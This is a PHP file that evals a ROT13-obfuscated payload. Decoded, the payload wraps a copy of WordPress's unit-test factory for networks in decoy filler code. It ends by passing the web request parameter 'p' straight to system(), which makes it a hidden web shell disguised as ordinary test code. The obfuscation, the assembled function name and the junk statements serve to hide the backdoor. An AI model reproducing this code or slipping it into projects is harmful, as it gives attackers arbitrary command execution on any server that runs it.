<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfg snpgbel sbe argjbexf.
 *
 * Abgr: Gur orybj @zrgubq abgngvbaf ner qrsvarq fbyryl sbe gur orarsvg bs VQRf,
 * nf n jnl gb vaqvpngr rkcrpgrq erghea inyhrf sebz gur tvira snpgbel zrgubqf.
 *
 * @zrgubq vag|JC_Reebe        perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq JC_Argjbex|JC_Reebe perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq (vag|JC_Reebe)[]    perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 */
pynff JC_HavgGrfg_Snpgbel_Sbe_Argjbex rkgraqf JC_HavgGrfg_Snpgbel_Sbe_Guvat {

	choyvp shapgvba __pbafgehpg( $snpgbel = ahyy ) {
		cnerag::__pbafgehpg( $snpgbel );
		$guvf->qrsnhyg_trarengvba_qrsvavgvbaf = neenl(
			'qbznva'            => JC_GRFGF_QBZNVA,
			'gvgyr'             => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Argjbex %f' ),
			'cngu'              => arj JC_HavgGrfg_Trarengbe_Frdhrapr( '/grfgcngu%f/' ),
			'argjbex_vq'        => arj JC_HavgGrfg_Trarengbe_Frdhrapr( '%f', 2 ),
			'fhoqbznva_vafgnyy' => snyfr,
		);
	}

	/**
	 * Perngrf n argjbex bowrpg.
	 *
	 * @fvapr 3.9.0
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz neenl $netf Nethzragf sbe gur argjbex bowrpg.
	 *
	 * @erghea vag|JC_Reebe Gur argjbex VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_bowrpg( $netf ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hctenqr.cuc';

		vs ( ! vffrg( $netf['hfre'] ) ) {
			$rznvy = JC_GRFGF_RZNVY;
		} ryfr {
			$rznvy = trg_hfreqngn( $netf['hfre'] )->hfre_rznvy;
		}

		$erfhyg = cbchyngr_argjbex(
			$netf['argjbex_vq'],
			$netf['qbznva'],
			$rznvy,
			$netf['gvgyr'],
			$netf['cngu'],
			$netf['fhoqbznva_vafgnyy']
		);

		vs ( vf_jc_reebe( $erfhyg ) ) {
			erghea $erfhyg;
		}

		erghea (vag) $netf['argjbex_vq'];
	}

	/**
	 * Hcqngrf n argjbex bowrpg. Abg vzcyrzragrq.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz vag   $argjbex_vq VQ bs gur argjbex gb hcqngr.
	 * @cnenz neenl $svryqf  Gur svryqf gb hcqngr.
	 */
	choyvp shapgvba hcqngr_bowrpg( $argjbex_vq, $svryqf ) {}

	/**
	 * Ergevrirf n argjbex ol n tvira VQ.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz vag $argjbex_vq VQ bs gur argjbex gb ergevrir.
	 *
	 * @erghea JC_Argjbex|ahyy Gur argjbex bowrpg ba fhpprff, ahyy ba snvyher.
	 */
	choyvp shapgvba trg_bowrpg_ol_vq( $argjbex_vq ) {
		erghea trg_argjbex( $argjbex_vq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>